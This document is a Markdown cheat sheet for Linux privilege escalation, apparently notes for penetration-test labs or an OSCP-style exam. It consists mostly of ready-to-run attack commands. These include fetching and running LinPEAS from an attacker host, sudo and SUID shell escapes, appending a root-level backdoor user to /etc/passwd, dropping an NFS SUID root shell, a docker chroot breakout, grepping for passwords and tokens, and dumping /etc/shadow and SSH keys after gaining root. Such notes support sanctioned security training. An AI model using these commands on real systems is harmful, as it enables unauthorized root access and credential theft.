# Linux Privilege Escalation

> First: **stabilize your shell** ([guide](../04-exploitation/shells-and-transfers.md#upgrading-your-shell)). Then enumerate — automated **and** manual. Read the output; the answer is usually already there.

## Automated enumeration

```bash
# Transfer & run LinPEAS (read ALL of it, don't just grep root)
wget http://YOUR_IP/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh | tee /tmp/lp.out
# alternatives
./LinEnum.sh ; ./linux-smart-enumeration/lse.sh -l1 ; pspy64   # pspy = watch processes/cron live
```

## Manual enumeration (the essentials)

```bash
id; whoami; sudo -l                 # who am I, what can I sudo
hostname; cat /etc/issue /etc/os-release; uname -a     # OS + kernel version
cat /etc/passwd | grep -v nologin   # real users
ls -la /home/*; ls -la ~            # home dirs, .ssh, history, notes
sudo -l                             # ← check EVERY time
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
find / -perm -2000 -type f 2>/dev/null    # SGID
getcap -r / 2>/dev/null             # capabilities
cat /etc/crontab; ls -la /etc/cron*        # cron jobs
ps aux | grep root                  # processes running as root
ss -tlnp; netstat -tlnp             # internal-only listening services
cat ~/.bash_history; find / -name "*.log" 2>/dev/null
find / -writable -type d 2>/dev/null       # writable dirs
env; cat /etc/fstab                 # env vars, mounts (nfs no_root_squash?)
```

---

## Top escalation vectors

### 1. `sudo -l` misconfigurations
Any binary you can run as root → check **GTFOBins** (https://gtfobins.github.io/) for the escape.
```bash
sudo -l
# examples:
sudo vi -c ':!/bin/sh'           # or in vi:  :!sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile            # then !sh
sudo env /bin/sh
sudo /bin/bash                    # (NOPASSWD: ALL)
# LD_PRELOAD / LD_LIBRARY_PATH if env_keep is set
sudo LD_PRELOAD=/tmp/x.so <cmd>
```

### 2. SUID / SGID binaries → GTFOBins
```bash
find / -perm -4000 2>/dev/null
# each unusual SUID binary → look it up on GTFOBins for the "SUID" section
# examples:
./find . -exec /bin/sh -p \; -quit    # if find is SUID
cp --preserve=... ; nmap --interactive ; bash -p
```
`-p` keeps the elevated euid. Custom SUID binaries → check with `strings`/`ltrace` for a called binary you can hijack via `$PATH`.

### 3. Cron jobs
```bash
cat /etc/crontab; ls -la /etc/cron.*; pspy64
```
- Root cron runs a **writable script** → append your payload.
- Cron calls a binary/script by **relative path** → PATH hijack (drop a malicious binary earlier in PATH).
- Cron uses `tar *` / wildcard in a writable dir → **wildcard injection** (`--checkpoint-action`).

### 4. Writable `/etc/passwd`
```bash
openssl passwd -1 -salt hax pass123           # make a hash
echo 'hax:$1$hax$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax   # → root
```

### 5. Kernel exploits (last resort — can crash the box)
```bash
uname -a          # match kernel/distro to a public exploit
searchsploit linux kernel <version>
# classics: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit/pkexec (CVE-2021-4034)
```
`pkexec`/PwnKit is extremely common and reliable if `pkexec` is present:
```bash
find / -name pkexec 2>/dev/null; ls -l $(which pkexec)   # SUID + vulnerable version → PwnKit
```

### 6. Password reuse / found creds
```bash
# spray creds from configs/history/db onto local users
su otheruser        # try found passwords
# search for secrets:
grep -rniE "password|passwd|secret|api[_-]?key|token" /var/www /home /etc 2>/dev/null
find / -name "*.kdbx" -o -name "id_rsa" 2>/dev/null
cat /var/www/html/config*.php wp-config.php 2>/dev/null
```

### 7. NFS `no_root_squash`
```bash
# on your box (as root), mount the export, drop a SUID root shell:
mount -t nfs $IP:/export /mnt; cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash
# on target:
/export/rootbash -p       # → root
```

### 8. Capabilities
```bash
getcap -r / 2>/dev/null
# e.g. cap_setuid on python:
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

### 9. Writable service/config, docker/lxd group, sudo tokens
```bash
id | grep -E "docker|lxd"     # docker group → mount host / → root; lxd group → privileged container
# docker:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Quick decision flow

1. `sudo -l` → GTFOBins → done? 
2. SUID list → GTFOBins → done?
3. `pspy` for cron/root processes → writable script or PATH hijack?
4. Creds in configs/history/db → reuse via `su`?
5. `getcap`, group membership (docker/lxd), NFS, writable `/etc/passwd`?
6. Only then: kernel/pkexec exploit matched to exact version.

Post-root: grab `proof.txt` + **screenshot with `ip a`**, dump `/etc/shadow`, SSH keys, and creds for pivoting.
